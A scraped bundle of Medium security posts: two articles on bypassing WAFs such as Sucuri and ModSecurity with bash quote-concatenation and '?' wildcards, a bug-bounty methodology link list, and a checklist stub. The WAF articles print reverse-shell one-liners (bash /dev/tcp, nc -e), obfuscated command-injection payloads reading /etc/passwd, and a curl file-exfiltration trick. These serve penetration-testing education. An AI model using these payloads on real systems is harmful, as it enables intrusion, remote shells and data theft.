Web Application Firewall (WAF) Evasion Techniques #2,https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0?source=tag_archive---------3-----------------------,"In the first part of WAF Evasion Techniques, we’ve seen how to bypass a WAF rule using wildcards and, more specifically, using the question mark wildcard. Obviously, there are many others ways to bypass a WAF Rule Set and I think that each attack has their specific evasion technique. For example: using comment syntax inside a SQL Injection payload could bypass many filters. I mean instead using union+select you can use something like:
/?id=1+un/**/ion+sel/**/ect+1,2,3--
This is a great technique, and it works well when the target WAF has a low paranoia level that allows asterisk * and hyphen characters. This should works just for SQL Injection and it can’t be used in order to exploit a Local File Inclusion or a Remote Command Execution. For some specific scenarios, there’s “a real nightmare” for a WAF that need to protect a web application from Remote Command Execution attacks… it’s called concatenated strings.
If you want to practice with some of these evasion techniques, recently I’ve created FluxCapacitor, an intentionally vulnerable virtual machine at hackthebox. This article don’t contain any hint to solve the specific scenario of FluxCapacitor but could improve your knowledge about this technique.
In many programming languages, string concatenation is a binary infix operator. The + (plus) operator is often overloaded to denote concatenation for string arguments: ""Hello, "" + ""World"" has the value ""Hello, World"". In other languages there is a separate operator, particularly to specify implicit type conversion to string, as opposed to more complicated behavior for generic plus. Examples include . in Perl and PHP, .. in Lua, etc… For example:
But if you’re thinking that this is the only way to concatenate strings, you’re absolutely wrong monsieur �
In a few languages like notably C, C++, Python, and the scripting languages / syntax which can be found in Bash, there is something called string literal concatenation, meaning that adjacent string literals are concatenated, without any operator: ""Hello, "" ""World"" has the value ""Hello, World"". This works not only for printf and echo commands, but for the whole bash syntax. Let start from the beginning.
Each one of the following commands have the same result:
This happens because all adjacent string literals are concatenated in Bash. In fact 'te's't' is composed of three strings: the string te, the string s and the string t. This syntax could be used to bypass a filter (or a WAF rule) that is based on “match phrases” (for example, the pm operator in ModSecurity).
The Rule SecRule ARGS ""@pm passwd shadow groups""… in ModSecurity will block all requests containing passwd or shadow. But what if we convert them to pa'ss'wd or sh'ad'ow? Like the SQLi syntax we’ve seen before, that split a query using comments, here too we can split filenames and system commands using the single quote ' and creating groups of concatenated strings. Of course, you can use a concatenated string as an argument of any command but not only… Bash allows you to concatenate path even for execution!
A few examples of the same command:
Now, let’s say that you’ve discovered a remote command execution on the url parameter of your application. If there’s a rule that blocks phrases like “etc, passwd, shadow, etc…” you could bypass it with something like this:
It’s time to make some tests! I’ll use the following PHP code in order to test it, as usual, behind Sucuri WAF and ModSecurity. Probably, reading this code, you’ll think that it’s too much stupid and simple and that no one uses curl inside a system() function instead of using the PHP curl functions… If you think it, you live in a better world than mine! :) You would be surprised at how many times I read this kind of thing inside source code of applications in production. The PHP code that I’ll use is:
I think that someone at Sucuri will delete my account soon after this two articles � But, I swear: I use Sucuri WAF for a comparison with my ModSecurity, not because I think that one is better than other one. Sucuri has a great service and I use it as an example just because it’s widely used and all their users, reading this article, could test better this techniques on their web applications.
First of all, I try to use this PHP application in order to get the response body of google.com without encoding the parameter’s value:
It works as expected, google.com 302 page says that I should follow the location www.google.de (google rightly geolocalize my server at Frankfurt):
Now, there’re many things that I could do in order to exploit this vulnerable application. One of this thing is to break the curl syntax with a semicolon ; and try to execute others system commands. Sucuri gets angry when I try to read the /etc/passwd file… For example:
went blocked by Sucuri WAF for the following reason: “An attempted RFI/LFI was detected and blocked”. I think (just a supposition, because users can’t see the details of a Sucuri WAF rule) that the Sucuri “RFI/LFI Attempt” rule uses something like the “match phrases” that we’ve seen before, with a list of common path and filenames like etc/passwd. This WAF has a very minimalist rule set and a very low “paranoia level” that allows me to bypass this rule using just two single quotes!
I know what you’re thinking: “Ok, you can read the passwd file bypassing all WAF’s rule set… but the real, biggest, most important and mother of all questions is: can you get a shell even Sucuri WAF is active and protect your application?” natürlich yes! The only problem is that we can’t use netcat, because it isn’t installed on the target container and yes: I’ve checked it using the remote command execution :)
The easiest way (with few special characters that could be blocked by WAF) is to use the bash -i command: bash -i >& /dev/tcp/1.1.1.1/1337 0>&1, but unfortunately is too complicated to bypass all rule set with this payload, and this means that it’ll be hard to use some PHP, Perl or Python code in order to obtain it. Sucuri WAF blocks my attempts with this reason: Obfuscated attack payload detected. Cool! isn’t it?
Instead of trying to get a shell by executing directly on the vulnerable parameter, I can try to upload a Python reverse shell to a writable directory using curl or wget. First, prepare the python code vi shell.py:
Then expose a webserver reachable from the target, as usual using python -c SimpleHTTPServer or php -S, etc… Then download the shell.py file from the target website, I’ve used the following syntax:
Ok, Sucuri WAF hasn’t blocked this request, but usually ModSecurity blocks this kind of shit :) If you want to be sure to bypass all “match phrases” rule types, you could use wget + ip-to-long conversion + string concatenation:
The first command uses wget to download the shell file in /tmp/. The second one uses chmod to make it executable and the third executes it. As you can see, there isn’t a specific file on the wget command request, so the downloaded file is named index.html by wget. You could expose this file using netcat nc by writing the response headers and response body by hand, something like this:
Now the hardest part…
Probably you’re thinking that with a low paranoia level you could bypass the OWASP Core Rule Set with this techniques as we’ve seen on the first article… hmm basically no. This because of two little things called normalizePath and cmdLine. In ModSecurity they are called “transformation function” and are used to alter input data before it is used in matching (for example, operator execution). The input data is never modified. ModSecurity will create a copy of the data, transform it, and then run the operator against the result.
normalizePath: It removes multiple slashes, directory self-references, and directory back-references (except when at the beginning of the input) from input string.
cmdLine: will break all your pentester dreams :) developed by Marc Stern, this transformation function avoids using escape sequences by normalizing the value of parameters and triggering all rules like LFI, RCE, Unix Command, etc… For example /e't'c/pa'ss'wd is normalized to /etc/passwd before any rule evaluation. It does a lot of things! like:
All attempts to exploit the RCE with a concatenated string are blocked by the rule 932160 because of the cmdLine transformation function:
Ok, I can’t read /etc/passwd but don’t despair! The OWASP Core Rule Set knows commons files, paths, and commands in order to block them but it can’t do the same with the source code of the target application. I can’t use the semicolon ; character (and it means that I can’t break the curl syntax) but I can use curl in order to exfiltrate files and send it to my remote server. This will work with a paranoia level from 0 to 3.
The trick is to send files to a remote server in the request body of a POST HTTP request, and curl can do it by using the data parameter -d:
Following the request, encoding @ to %40:
All this will not work if the target has a paranoia level set to 4 because the payload contains characters like hyphen, forward slash, etc… The good news is that a paranoia level of 4 is really rare to find in a production environment.
The same technique works using the backslash \ character too. This is not a concatenation string but just an escape sequence:
That’s all for now. So long and thanks for all the fish!
-theMiddle
Bypass a WAF by Positive Technology https://www.ptsecurity.com/upload/corporate/ww-en/download/PT-devteev-CC-WAF-ENG.pdf
Web Application Firewalls: Attacking detection logic mechanisms by Vladimir Ivanov (blackhat USA 2016) https://www.blackhat.com/docs/us-16/materials/us-16-Ivanov-Web-Application-Firewalls-Analysis-Of-Detection-Logic.pdf
SQLi bypassing WAF on OWASP by Dhiraj Mishra https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF
All HTB users that shared with me their approach to FluxCapacitor and notably: arkantolo, snowscan, decoder, phra
Andrea (theMiddle) MeninTwitter: https://twitter.com/Menin_TheMiddleGitHub: https://github.com/theMiddleBlueLinkedin: https://www.linkedin.com/in/andreamenin/
Written by
","['Opinion', 'OSINT', 'How To', 'Cybersecurity', 'Web Development', 'Vulnerability', 'Python', 'Hacking']"
Web Application Firewall (WAF) Evasion Techniques - secjuice™ - Medium,https://medium.com/secjuice/waf-evasion-techniques-718026d693d8?source=tag_archive---------1-----------------------,"It’s not so rare to discover a Remote Command Execution vulnerability in a web application, and it is confirmed by the “OWASP Top 10 application security risk 2017” that puts “Injection” at the first position:
Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
All moderns Web Application Firewall are able to intercept (and even block) RCE attempts, but when it happens in a Linux system we’ve got an incredible amount of ways to evade a WAF rule set. The biggest friend of a penetration tester is not a dog… its name is “wildcard”. Before starting doing WAPT stuff, I want to show you things may you don’t know about bash and wildcards.
Bash standard wildcards (also known as globbing patterns) are used by various command-line utilities to work with multiple files. For more information on standard wildcards, refer to the manual page by typing man 7 glob. Not everyone knows that there’re lots of bash syntaxes that makes you able to execute system commands just using the question mark “?”, the forward slash “/”, numbers, and letters. You can even enumerate files and get their contents using the same amount of characters. How? I give you some examples:
Instead executing ls command, you can use the following syntax:/???/?s
With this kind of syntax, you could execute basically everything you want. Let’s say that your vulnerable target is behind a Web Application Firewall, and this WAF has a rule that blocks all requests containing /etc/passwd or /bin/ls inside the value of a GET parameter or inside the body in a POST request. If you try to make a request like /?cmd=cat+/etc/passwd it’ll be blocked by the target WAF and your IP will be banned forever and tagged as “yet another f***in’ redteamer”. But you have a secret weapon in your pocket called wildcard. If you are lucky (not so lucky, we’ll see after) the target WAF doesn’t have a “paranoia level” adequate in order to block characters like ? and / inside a query-string. So you can easily make your request (url-encoded) like this:/?cmd=%2f???%2f??t%20%2f???%2fp??s??
As you can see in the screenshot above, there’re 3 errors “/bin/cat *: Is a directory”. This happens because /???/??t can be “translated” by the globbing process to /bin/cat but also /dev/net or /etc/apt , etc…
The question mark wildcard represents only one character which can be any character. Thus in case you know a part of a filename but not one letter, then you could use this wildcard. For example ls *.??? would list all files in the current directory that have an extension of 3 characters in length. Thus files having extensions such as .gif , .jpg , .txt would be listed.
Using this wildcard you could execute a reverse shell using netcat. let’s say that you need to execute a reverse shell to 127.0.0.1 at port 1337 (usually nc -e /bin/bash 127.0.0.1 1337), you can do it with a syntax like:/???/n? -e /???/b??h 2130706433 1337
Converting the IP Address 127.0.0.1 in “long” format (2130706433), you can avoid using “dot” characters in your HTTP request.
In my kali I need to use nc.traditional instead of nc that doesn’t have the -e parameter in order to execute /bin/bash after connect. The payload become something like this:
Following a little summary of the two commands that we’ve just seen:
Standard: /bin/nc 127.0.0.1 1337 Evasion:/???/n? 2130706433 1337 Used chars: / ? n [0-9]
Standard: /bin/cat /etc/passwdEvasion: /???/??t /???/??ss??Used chars: / ? t s
Why using ? instead of *? Because the asterisk (*) is widely used for comment syntax (something like /* hey I’m a comment */) and many WAF blocks it in order to avoid SQL Injection… something like UNION+SELECT+1,2,3/*
Enumerate files and directories using echo? yes, you can. The echo command could enumerate files and directories on file system using wildcard. For example: echo /*/*ss* :
This could be used on a RCE in order to get files and directories on the target system, for example:
But why using wildcard (and in particular the question mark) can evade a WAF rule set? Let me start with Sucuri WAF!
Which is the best way to test a WAF Rule Set? Create the most vulnerable PHP script in the world and try all possible techniques! In the screenshot above we have: in the top left pane there’s my ugly web application (it’s just a PHP script that executes commands):
In the bottom left pane you can see a test of Remote Command Execution on my website protected by Sucuri WAF (test1.unicresit.it). As you can see Sucuri blocks my request with reason “An attempted RFI/LFI was detected and blocked”. This reason is not completely true but the good news is that the WAF blocked my attack (I don’t even know why a firewall should tell me the reason for a blocked request, but there should be a reason… for sure).
The right pane is the most interesting of all, because it shows the same request but using the “question mark” as a wildcard. The result is frightening… The request is accepted by Sucuri WAF and my application executes the command that I put in c parameter. Now I can read the /etc/passwd file and even more… I can read the PHP source of application itself, I can execute reverse shell using netcat(or as I love to call it: /???/?c), or I could execute programs like curlor wget in order to reveal the real IP Address of the web server that make me able to bypass the WAF by connecting directly to the target.
I don’t know if this happens because I missed something on my Sucuri WAF configuration, but it not seems… I’ve asked at Sucuri if it’s an attended behavior and if they configure a default “low paranoia level” in order to avoid false positives, but I’m still waiting for an answer.
Please, keep in mind that I’m doing this test using a stupid PHP script that doesn’t represent a real scenario. IMHO you shouldn’t judge a WAF based on how many requests it blocks, and Sucuri is not less secure just because can’t totally protect an intentionally vulnerable website. Necessary clarification done!
I really love ModSecurity, I think that the new libmodsecurity (v3) used with Nginx and the Nginx connector is the best solution that I have ever used in order to deploy a Web Application Firewall. I’m also a big fan of the OWASP Core Rule Set! I use it everywhere but, if you don’t know well this rule set, you need to pay attention to a little thing called love.. ehm sorry Paranoia Level!
The following “schema” that you can find here is a good overview of how each level works on “REQUEST PROTOCOL ENFORCEMENT” rules. As you can see with a PL1 a query string can contains only ASCII characters in the range 1–255 and it becomes more restrictive until the PL4 that blocks everything that isn’t an ASCII character in a very small range.
let’s do some test with all levels!
A paranoia level 0 means that many rules are disabled, so it’s absolutely normal that our payload can lead to a Remote Command Execution without any problem. Don’t panic :)
A paranoia level 1 in ModSecurity means “flawless rules of high quality with virtually no false positives” but it’s also too much permissive. You can find a list of rules grouped by paranoia level at netnea website: https://www.netnea.com/cms/core-rule-set-inventory/
I’ve grouped levels 1 and 2 because their differences (as you can see in the schema above) doesn’t affect our goal, all behaviors are the same as described below.
with PL1 (and PL2) ModSecurity obviously blocks my request for “OS File Access Attempt” (930120). But what if I use the question mark as a wildcard? The request is accepted by my WAF:
This happens because the “question mark”, the “forward slash” and the “space” are in the accepted range of characters on rules 920271 and 920272. Moreover, using “question marks” instead of command syntax make me able to evade “OS Files” filters that intercept common commands and files of Operating Systems (such as /etc/passwd in our case).
This level of paranoia has a plus: it blocks request containing characters like “?” more than n times. In fact, my requests have been blocked as “Meta-Character Anomaly Detection Alert — Repetitive Non-Word Characters”. this is cool! nice job ModSecurity, you win a teddy bear! � But unfortunately, my web app is so ugly and vulnerable that I can use less question mark and read the passwd file anyway using this syntax: c=/?in/cat+/et?/passw?
As you can see, using just 3 “?” question mark I can evade this paranoia level and read the passwd file inside the target system. OK, this doesn’t mean that you have to set your paranoia level to 4 always and unconditionally. Keep in mind that I’m testing it with a really stupid PHP script that doesn’t represent a real scenario… I hope…
Now everybody knows that 42 is the answer to life, the universe and everything. But what about: “Will you evade the OWASP Rule Set at paranoia level 4?”
basically no, I can’t. All characters outside the range a-z A-Z 0–9 are blocked! No way… and trust me, when you need to execute a command in order to read files, there’s a 90% of probabilities that you need a “space” char or a “forward slash” �
Second part of this article: https://medium.com/@themiddleblue/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0
Back to static HTML pages… it’s the fastest way to improve the security of your web application! � It’s hard to say what’s the best configuration to avoid WAF evasion, or what’s the best paranoia level to use. IMHO, we shouldn’t trust in a rule set evenly distributed on a web application. Indeed I think we should configure our WAF rules contextualized per application functionality.
Anyway, when you write a new SecRule on your ModSecurity or something like, keep in mind that probably there’re many ways to elude your filter / regular expression. So write it thinking of “how can I evade this rule?”.
Learn more about ModSecurity Rules: https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual
Apache ModSecurity tutorial by netnea: https://www.netnea.com/cms/apache-tutorials/
SpiderLabs Blog: https://www.trustwave.com/Resources/SpiderLabs-Blog/
ModSecurity v3 Github: https://github.com/SpiderLabs/ModSecurity/tree/v3/master
https://twitter.com/Menin_TheMiddlehttps://github.com/theMiddleBlue
Written by
","['Opinion', 'OSINT', 'How To', 'Hacking', 'Information Security', 'Infosec', 'Cybersecurity']"
"Web Application Security & Bug Bounty (Methodology, Reconnaissance, Vulnerabilities, Reporting)",https://blog.usejournal.com/web-application-security-bug-bounty-methodology-reconnaissance-vulnerabilities-reporting-635073cddcf2?source=tag_archive---------7-----------------------,"Hello Folks , Hope everyone is doing good. This blog is basically for Web Security Methodology (WSM).
Have you read my last post regarding “Bug Bounty Methodology” ? If you missed it go to this BBM link https://medium.com/@infosecsanyam/bug-bounty-hunting-methodology-toolkit-tips-tricks-blogs-ef6542301c65
Now this time i will share methodology for Web Application Security Assessment from beginning to end (Recon to Reporting/ R&R) . Try to cover most of the vulnerabilities links for web application security.
Methodology of Application Vulnerability Assessment & Pen-testing
Defining a Scope
Reconnaissance
Manual Assessment (Web Security Vulnerabilities)
Reports
Defining a Scope :
Each bug bounty or Web Security Project has a “scope”, or in other words, a section of a Scope of Project ,websites of bounty program’s details that will describe what type of security vulnerabilities a program is interested in receiving, where a researcher is allowed to test and what type of testing is permitted. On Bug-crowd, a bounty’s scope can be found in the “Program Details” bounty brief section of a program page. In your web application project has give the scope which websites , subdomains, api’s links for assessment.
Reconnaissance:
Therefore I will not be explaining how to test for vulnerabilities, but rather where to test for them & the tools you can use. This is mainly just a general overview of how someone would map out a target site and efficiently perform reconnaissance to gain as much info on the site as possible before beginning their audit.Recon is an essential element of any penetration testing.
For Finding Web Security Vulnerabilities are not very simple . When you’re taking part in a bug bounty program, you’re competing against both the security of the site, and also against the thousands of other people who are taking part in the program. For this reason, it’s important to think critically.
This is why passive and active reconnaissance is especially important for Scope, as you need to look a lot deeper than you would in a regular penetration test.
Sometimes I forgot to do That and Shit happens Submitting things that aren’t within scope of the bounty program, tells the people running the program that you haven’t properly read the terms, and it will lead to them not taking your future reports seriously. I mean Seriously
Start a Reconnaissance
1. https://pentest-tools.com/
2. https://virustotal.com/
3. https://www.shodan.io/
4. https://crt.sh/?q=%25taregt.com
5. https://dnsdumpster.com/
6. https://censys.io
7. http://dnsgoodies.com
Github Open Source tools for Subdomain Finding :-
After getting all sub-domains we found two methods to scan an ip’s, ports and Services:
1. Masscan can also help https://github.com/robertdavidgraham/masscan
2. Aquatone : https://github.com/michenriksen/aquatone
3. Nmap
Also Just don’t get limited to Subdomains Try extracting vhosts � tools like
Also Don’t forget your best friend Google :p Use google Dorks U can make your own or use make by others �
Try it out
Google Dorks :
site:target.com -wwwsite:target.com intitle:”test” -supportsite:target.com ext:php | ext:htmlsite:subdomain.target.comsite:target.com inurl:authsite:target.com inurl:dev
Information Gathering Part
1. Whois Information
2. Subdomains
3. Dir info
4. S3 Buckets
5. social accounts
6. API Endpoints
7. emails
8. Vhosts
9. Backend IP address
10. Open Ports / Services running
11. Service version info (if applicable)
12. server banners
13. directory listings
14. presence security headers
Make sure to spend as much time as possible performing recon, until you have a pretty good feel of how the site operates,
There are even occasions where passive recon can lead to some important information Disclosure. i.e. searching github or pastebin for the company name and stumbling across some random source that ended up online after some sloppy developer wrote it.
For that I would prefer
Don’t forget to look deep into Js files well manually you will love it But time saving is the goal so try using tools like
1 https://github.com/jobertabma/relative-url-extractor
To look for older content that can give u ideas of site structure or maybe vulnerable endpoints � For that use
Maybe reverse whois lookup will help to discover more potential targets but make sure that they are in scope
1. http://viewdns.info/reversewhois/?q=
Alright, so then there’s this thing called PunkSpider. (https://www.punkspider.org) “It is a global web application vulnerability search engine. Don’t get too excited though.
Web Application Vulnerabilities & Bug Bounty Reference
A list of bug bounty / web app security write-up that is categorized by the bug nature,
1 Sql Injection :
SQL injection is a kind of injection vulnerability in which the attacker tries to inject arbitrary pieces of malicious data(Code) into the input fields of an application, which, when processed by the application, causes that data to be executed as a piece of code by the back end SQL server, thereby giving undesired results which the developer of the application did not anticipate.
List of Database
Type of SQL Injection
SQLI Exploitation Technique
Try to Identify- where the application interact with DB
Based on the response received from the server
Error-based SQL injections
Blind SQL Injections
Sql Injection Practice Lab
1. http://leettime.net/sqlninja.com/
2. http://hack.me/
3. http://www.sqlinjection.net/
4. https://sqlzoo.net/
5. https://github.com/Audi-1/sqli-labs
Tutorials
1. https://www.exploit-db.com/
2. https://www.hackingarticles.in/
3. http://securityidiots.com/
4. http://breakthesecurity.cysecurity.org/
5. http://lastc0de.blogspot.com/2013/07/tutorial-sql-injection-manual.html
SQL Injection Bug Bounty Writeups Written by ngalongc & @arushsinghania this is inspired by https://github.com/djadmin/awesome-bug-bounty:-
Cross Site Scripting Tutorial & Pratical
1. https://excess-xss.com/
2. https://hackertarget.com/xss-tutorial/
3. https://xss-game.appspot.com/
4. http://leettime.net/xsslab1/chalg1.php
5. https://hack.me/t/XSS
6. https://xss-quiz.int21h.jp/
7. https://steve.fi/Security/XSS/Tutorial/
8. https://www.hacking-tutorial.com/hacking-tutorial/xss-attack-hacking-using-beef-xss-framework/#sthash.pIAyu7PF.dpbs
Cross-Site Scripting (XSS) Bug Bounty
Brute Force
Stealing Access Token
Google oauth bypass
CSRF
Remote Code Execution
Deserialization
Image Tragick
Insecure Direct Object Reference (IDOR)
XXE (XML External Entity)
Unrestricted File Upload
Server Side Request Forgery (SSRF)
Race Condition
Business Logic Flaw
Authentication Bypass
HTTP Header Injection
Subdomain Takeover
Author Write Up
XSSI
Email Related
Money Stealing
Local File Inclusion
CSV Injection :
1. https://hackerone.com/reports/386116
2. https://hackerone.com/reports/72785
3. https://hackerone.com/reports/223344
4. https://hackerone.com/reports/244292
5. https://payatu.com/csv-injection-basic-to-exploit/
6. https://www.owasp.org/index.php/CSV_Injection
7. https://www.we45.com/blog/2017/02/14/csv-injection-theres-devil-in-the-detail
CRLF: (Carriage Return line feed)
1. https://www.netsparker.com/blog/web-security/crlf-http-header/
2. https://hackerone.com/reports/217058
3. https://hackerone.com/reports/66391
4. https://hackerone.com/reports/237357
5. https://www.acunetix.com/websitesecurity/crlf-injection/
6. https://www.owasp.org/index.php/CRLF_Injection
Host header injection :
1. https://www.linkedin.com/pulse/host-header-injection-depth-utkarsh-tiwari
2. https://hackerone.com/reports/94637
3. https://medium.com/@rockerramg94/host-header-injection-attack-6cf4ffeb5a03
4. https://dzone.com/articles/what-is-a-host-header-attack
5. https://www.acunetix.com/vulnerabilities/web/host-header-attack/
6. https://hackerone.com/reports/235281
Cache poisoning
1. https://blog.stackpath.com/glossary/cache-poisoning/
2. https://portswigger.net/blog/practical-web-cache-poisoning
3. https://hackerone.com/reports/487
4. https://www.hackerone.com/zerodaily/2018-08-10
HTTP Response Splitting
1. https://www.owasp.org/index.php/HTTP_Response_Splitting
2.http://projects.webappsec.org/w/page/13246931/HTTP%20Response%20Splitting
3. https://hackerone.com/reports/171473
4. https://hackerone.com/reports/52042
5. https://hackerone.com/reports/53843
Web parameter tampering :
1. https://www.owasp.org/index.php/Web_Parameter_Tampering
2. https://hackerone.com/reports/141090
3. https://hackerone.com/reports/218748
Express Lang injection:
1. https://portswigger.net/kb/issues/00100f20_expression-language-injection
2. http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
3. https://www.owasp.org/index.php/Expression_Language_Injection
4. https://www.scribd.com/document/212883640/Expression-Language-Injection
HTML Injection
1. https://www.acunetix.com/vulnerabilities/web/html-injection/
2. https://www.owasp.org/index.php/Testing_for_HTML_Injection_(OTG-CLIENT-003)
3. https://admin.utep.edu/Default.aspx?tabid=54090
4. https://hackerone.com/reports/328210
5. https://hackerone.com/reports/324548
6. https://hackerone.com/reports/383117
Blind XPATH Injection:-
1. https://www.owasp.org/index.php/Blind_XPath_Injection
2. https://www.scip.ch/en/?labs.20180802
3. https://www.paladion.net/blogs/xpath-injection-in-xml-databases
4. http://www.hackeone.info/2017/11/xpath-injection-tutorial-to-hack.html
LDAP Injection:-
1. http://projects.webappsec.org/w/page/13246947/LDAP%20Injection
2. https://www.owasp.org/index.php/LDAP_injection
3. https://portswigger.net/kb/issues/00100500_ldap-injection
4. https://www.synopsys.com/software-integrity/resources/knowledge-database/ldap-injection.html
OS Command Injection
1. https://www.owasp.org/index.php/Command_Injection
2.https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)
3. https://www.checkmarx.com/knowledge/knowledgebase/OS-Command_Injection
4. https://www.hackingarticles.in/beginner-guide-os-command-injection/
5. https://hackerone.com/reports/303061
6. https://hackerone.com/reports/331032
7. https://hackerone.com/reports/340208
8. https://hackerone.com/reports/390865
9. https://hackerone.com/reports/388936
10. https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d
SOP Bypass
1. https://resources.infosecinstitute.com/bypassing-same-origin-policy-sop/#gref
2. https://www.hackinglab.com/misc/downloads/event_2010/simon_egli_same_origin_policy_v1.0.pdf
3. https://hackerone.com/reports/164916
4. https://hackerone.com/reports/399427
5. https://hackerone.com/reports/235200
UI redressing attack & Clickjacking :
1. https://www.owasp.org/index.php/Clickjacking
2. https://www.imperva.com/Resources/Glossary/clickjacking-ui-redressing
3. https://www.geeksforgeeks.org/clickjacking-ui-redressing/
4. https://www.thesecuritybuddy.com/vulnerabilities/what-is-clickjacking-or-ui-redress-attack/
5. https://nakedsecurity.sophos.com/2008/10/09/ui-redress-attacks-aka-clickjacking/
6. https://hackerone.com/reports/85624
7. https://hackerone.com/reports/299009
8. https://medium.com/@raushanraj_65039/google-clickjacking-6a04132b918a
9. http://jasminderpalsingh.info/single.php?p=87
10. http://blog.securelayer7.net/clickjacking-vulnerability-google-cloud-print/
Session Fixation :
1. https://www.owasp.org/index.php/Session_fixation
2. https://www.owasp.org/index.php/Testing_for_Session_Fixation_(OTG-SESS-003)
3. http://projects.webappsec.org/w/page/13246960/Session%20Fixation
4. https://medium.com/white-hats/introduction-to-session-fixing-75409ffeaa5
5. https://medium.com/@grep_security/session-fixation-broken-authentication-and-session-management-c37ce0111bf5
6. https://hackerone.com/reports/135797
7. https://hackerone.com/reports/18501
8. https://hackerone.com/reports/167698
Missing http only
1. https://www.owasp.org/index.php/HttpOnly
2. https://hackerone.com/reports/239380
3. https://hackerone.com/reports/75357
4. https://resources.infosecinstitute.com/securing-cookies-httponly-secure-flags/#gref
Error Message Reveals sensitive Information/ Visible Detailed Error/Debug Page
1. https://hackerone.com/reports/304708
2. https://hackerone.com/reports/294464
3. https://hackerone.com/reports/20279
Token Leakage via Referrer
1. https://hackerone.com/reports/272379
2. https://hackerone.com/reports/342693
3. https://hackerone.com/reports/252544
4. https://hackerone.com/reports/265740
5. https://hackerone.com/reports/253448
User Enumeration:
1.https://www.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)
2. https://blog.rapid7.com/2017/06/15/about-user-enumeration/
3. https://www.hacksplaining.com/prevention/user-enumeration
4. https://portswigger.net/blog/preventing-username-enumeration
5. https://hackerone.com/reports/282564
6. https://hackerone.com/reports/280509
7. https://hackerone.com/reports/250457
8. https://hackerone.com/reports/179701
9. https://hackerone.com/reports/223531
10. https://hackerone.com/reports/257035
11. https://hackerone.com/reports/335427
CSS Injection :
1. https://portswigger.net/kb/issues/00501300_css-injection-reflected
2. https://www.owasp.org/index.php/Testing_for_CSS_Injection_(OTG-CLIENT-005)
3. https://hackerone.com/reports/315865
4. https://hackerone.com/reports/386334
Miscellaneous
10 rules of Bug Bounty
Following “10 rules of Bug Bounty”
Writing Successful Bug & Vulnerability Submission Report
Legend has it that the best bug bounty hunters can write reports in their sleep. OK, jokes aside, while writing reports is a very important part of bug bounty hunting, we can simplify this whole process by following these basic guidelines.
The first section of your report should start with a brief summary introducing the reader to your finding. Summaries can be as simple as:
example.com is vulnerable to reflected XSS via the q parameter.
Or as detailed as:
https://imgur.com/vidgif/url endpoint is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from imgur servers to any destination on the internet and imgur internal network and craft outgoing UDP-packets / telnet-based protocol sessions (for example, to connect to SMTP servers from imgur and send spam). [1]
This section covers all the details related to your finding. State what you found again, make the technical points clear, and explain what causes the issue. There are exceptions though where this section can be skipped. There is a popular English idiom:
“A picture is worth a thousand words.”
The same can be said about an excellent proof of concept:
“A phenomenal security vulnerability proof of concept is worth a thousand words.”- Probably Gandhi
The proof of concept is where you really need to demonstrate the impact in the “flashiest” way possible. Make it as easy as possible for the program to see what the issue is. If your issue is cross-site scripting, then an alert(document.domain) can go a long way to help the program figure out where the issue lies.
Even if the issue is not browser-dependent, it is good practice to inform the program about what browser you used to trigger the vulnerability. This can help the team behind the bug bounty program reproduce your finding.
If you followed the advice in “How do I get started with bug bounty hunting?”, you should be capable of giving a brief description of how the bug bounty program should fix your finding. It is also a good idea to link to the relevant OWASP Prevention cheat sheet.
Report Writing Well that’s all Folks Hopefully my way of doing basic recon can help you to properly Select the target-Map it out properly-Hunt it down using the information you have gathered and At the end Writing a Report suggestion is to read the blog https://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/
Good Report Example :
1. https://hackerone.com/reports/73567
2. https://bugbountyguide.com/hunters/writing-reports.html
Some great resources for vulnerability report best practices are:
Hope you like it , If you have any queries … Feel free to connect me through linkedin or Twitter :) If I missed something, kindly comment below so i will add to the Bug Bounty- Infosec List- If you like this blog- do clap and share with your friends :)
Whoami:- https://infosecsanyam.wixsite.com/infosecsanyam
Blog :- https://infosecsanyam.blogspot.in/
Linkedin : https://www.linkedin.com/in/infosecsanyam/
“Failure will never overtake me if my determination to succeed is strong enough.“ “ If you don’t give up , you still have a chance” :)
� Read this story later in Journal.
� Wake up every Sunday morning to the week’s most noteworthy Tech stories, opinions, and news waiting in your inbox: Get the noteworthy newsletter >
Written by
","['Your Stories', 'Youtube XSS', 'Bypass redirect_uri', 'Paypal RCE', 'Java deserialization', 'Yahoo Bleed 1', 'Yahoo Bleed 2', 'Twitter CRLF', 'JSON hijacking', 'OWASP XSSI', 'NoSQL Injection', 'XXE Cheatsheet', 'Security', 'Cybersecurity', 'Web Security', 'Bug Bounty', 'Methodology']"
Web Developer Security Checklist v1 - Simple Security - Medium,https://medium.com/simple-security/web-developer-security-checklist-f2e4f43c9c56?source=tag_archive---------1-----------------------,"This checklist has been updated at Web Developer Checklist V2. Also available on Medium.
Developing secure, robust web applications in the cloud is hard, very hard. If you think it is easy, you are either a higher form of life or you have a painful awakening ahead of you.
If you have drunk the MVP cool-aid and believe that you can create a product in one month that is both valuable and secure — think twice before you launch your “proto-product”. After you review the checklist below, acknowledge that you are skipping many of these critical security issues. At the very minimum, be honest with your potential users and let them know that you don’t have a complete product yet and are offering a prototype without full security.
This checklist is simple, and by no means complete. I’ve been developing secure web applications for over 14 years and this list contains some of the more important issues that I’ve painfully learned over this period. I hope you will consider them seriously when creating a web application.
Please comment if you have an item I can add to the list.
Lower Cloud Costs for DevOps. PowerDown idle cloud resources.
Written by
","['Archive', 'SenseDeep', 'AWS Aurora', 'Vault', 'CI-CD', 'bcrypt', 'CloudFlare', 'CSP', 'Subresource Integrity', 'SameSite Cookie', 'immutable hosts', 'APTs', 'powered down', 'Cybersecurity', 'Cloud Computing', 'DevOps', 'Web Development']"
